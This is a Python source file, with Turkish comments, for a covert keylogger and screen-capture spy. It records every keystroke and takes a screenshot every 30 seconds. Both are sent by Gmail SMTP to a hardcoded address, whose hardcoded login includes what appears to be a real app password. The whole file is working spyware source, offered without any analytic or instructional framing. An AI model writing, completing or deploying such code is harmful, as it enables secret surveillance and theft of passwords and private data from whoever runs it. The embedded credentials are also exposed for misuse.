import smtplib
import time
import pyautogui
import pynput.keyboard
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

log = ''

def callback_function(key):
    global log
    try:
        #log = log + key.char.encode('utf-8')
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.tab:
            log = log + 'tab'  # Sekme tuşuna basıldıysa, log değişkenine 'tab' ekler
        elif key == key.backspace:
            log += 'silme'  # Geri tuşuna basıldıysa, log değişkenine 'silme' ekler
        elif key == key.enter:
            log += 'enter'  
        elif key == key.ctrl_l:
            log += 'ctrl_1'
        elif log == key.ctrl_r:
            log += 'ctrl_r'
        elif log == key.alt_l:
            log += 'alt_1'
        elif log == key.alt_gr:
            log += 'alt_r'
        elif log == key.cmd:
            log += 'win'
        elif log == key.cmd_r:
            log += 'win_r'
        elif log == key.menu:
            log += 'fn'
        else:
            log = log + str(key)
    except:
        pass

    print(log)


# E-posta ayarları
email_sender = "rastgeletryhackme@gmail.com"
email_receiver = "rastgeletryhackme@gmail.com"
email_subject = "Ekran Görüntüsü"

# E-posta sunucusu ve kimlik doğrulama bilgileri
smtp_server = "smtp.gmail.com"
smtp_port = 587
smtp_username = "rastgeletryhackme@gmail.com"
smtp_password = "emiokybnnrttvizv"

def send_email(filename):
    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['Subject'] = email_subject

    body = MIMEText("Ekran görüntüsü ekte.", 'plain')
    msg.attach(body)

    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    text = msg.as_string()
    server.sendmail(email_sender, email_receiver, text)
    server.quit()

def take_screenshot_and_send_email():
    while True:
        # Ekran görüntüsü al
        screenshot = pyautogui.screenshot()
        filename = "screenshot.png"
        screenshot.save(filename)

        # E-posta ile gönder
        send_email(filename)

        # Dosyayı sil
        os.remove(filename)
        # 30 saniye bekle
        time.sleep(30)
def sender_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

def thread_function():
    global log
    sender_email("rastgeletryhackme@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

if __name__ == "__main__":
    keylogger_listener.start()
    thread_function()
    take_screenshot_and_send_email()
    keylogger_listener.join()

